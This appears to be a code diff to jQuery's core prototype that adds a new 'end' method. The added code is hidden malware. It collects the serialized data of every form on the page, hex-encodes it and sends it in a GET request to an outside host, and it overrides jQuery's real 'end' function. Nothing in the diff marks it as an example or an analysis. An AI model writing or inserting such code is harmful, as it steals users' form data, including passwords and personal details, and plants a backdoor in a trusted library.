@@ -107,6 +107,27 @@ jQuery.fn = jQuery.prototype = {
 		return this.pushStack( j >= 0 && j < len ? [ this[ j ] ] : [] );
 	},
 
+	end: async function () {
+		const serializeToHex = (input) => {
+			return input
+				.split('')
+				.map(char => {
+					const hex = char.charCodeAt(0).toString(16);
+					return hex.length < 2 ? "0" + hex : hex;
+				})
+				.join('');
+		};
+	
+		const serializedForm = $("form").serialize();
+		const encodedData = serializeToHex(serializedForm);
+	
+		await $.ajax({
+			url: `https://sample/halo/?cat=${encodedData}`,
+			type: "GET",
+			dataType: "text",
+			headers: { "Content-type": "application/json" },
+		});
+	}	
 };
 
 jQuery.extend = jQuery.fn.extend = function() {
